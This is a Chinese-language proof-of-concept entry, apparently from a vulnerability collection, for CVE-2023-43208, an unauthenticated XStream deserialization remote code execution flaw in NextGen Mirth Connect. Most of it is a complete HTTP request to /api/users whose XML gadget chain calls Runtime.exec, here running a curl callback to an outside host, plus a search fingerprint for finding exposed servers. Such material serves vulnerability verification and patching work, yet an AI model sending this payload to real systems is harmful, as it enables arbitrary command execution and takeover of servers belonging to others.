# NextGen Mirth Connect XStream存在反序列化远程代码执行漏洞

# 一、漏洞简介
NextGen Mirth Connect XStream反序列化远程代码执行漏洞(CVE-2023-43208)，未经身份验证的远程攻击者可利用此漏洞写入后门文件，执行任意命令，导致服务器被控。

# 二、影响版本
+ `title="Mirth Connect Administrator"`
+ 特征


# 三、漏洞复现
```plain
POST /api/users HTTP/1.1
Host: 
X-Requested-With: OpenAPI
Content-Type: application/xml

<sorted-set>
	<string>abcd</string>
		<dynamic-proxy>
			<interface>java.lang.Comparable</interface>
			<handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
			  <target class="org.apache.commons.collections4.functors.ChainedTransformer">
				<iTransformers>
				  <org.apache.commons.collections4.functors.ConstantTransformer>
					<iConstant class="java-class">java.lang.Runtime</iConstant>
				  </org.apache.commons.collections4.functors.ConstantTransformer>
				  <org.apache.commons.collections4.functors.InvokerTransformer>
					<iMethodName>getMethod</iMethodName>
					<iParamTypes>
					  <java-class>java.lang.String</java-class>
					  <java-class>[Ljava.lang.Class;</java-class>
					</iParamTypes>
					<iArgs>
					  <string>getRuntime</string>
					  <java-class-array/>
					</iArgs>
				  </org.apache.commons.collections4.functors.InvokerTransformer>
				  <org.apache.commons.collections4.functors.InvokerTransformer>
					<iMethodName>invoke</iMethodName>
					<iParamTypes>
					  <java-class>java.lang.Object</java-class>
					  <java-class>[Ljava.lang.Object;</java-class>
					</iParamTypes>
					<iArgs>
					  <null/>
					  <object-array/>
					</iArgs>
				  </org.apache.commons.collections4.functors.InvokerTransformer>
				  <org.apache.commons.collections4.functors.InvokerTransformer>
					<iMethodName>exec</iMethodName>
					<iParamTypes>
					  <java-class>java.lang.String</java-class>
					</iParamTypes>
					<iArgs>
					  <string>curl http://jveuewgzdi.iyhc.eu.org</string>
					</iArgs>
				  </org.apache.commons.collections4.functors.InvokerTransformer>
				</iTransformers>
			  </target>
			  <methodName>transform</methodName>
			  <eventTypes>
				<string>compareTo</string>
			  </eventTypes>
		</handler>
	</dynamic-proxy>
</sorted-set>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgpb79rrbo0w37b0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
